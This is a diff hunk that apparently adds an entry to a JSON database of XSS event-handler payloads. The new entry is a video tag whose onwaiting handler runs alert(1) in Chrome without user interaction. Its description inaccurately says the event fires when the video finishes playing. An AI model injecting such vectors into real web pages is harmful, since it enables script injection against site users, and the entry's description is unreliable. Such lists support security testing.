@@ -9581,5 +9581,18 @@
                 "interaction": true
             }
         ]
+    },
+    "onwaiting": {
+        "description": "Fires when the video finishes playing",
+        "tags": [
+            {
+                "tag": "video",
+                "code": "<video controls loop muted autoplay onwaiting=alert(1)><source src=validvideo.mp4 type=video/mp4></video>",
+                "browsers": [
+                    "chrome"
+                ],
+                "interaction": false
+            }
+        ]
     }
 }
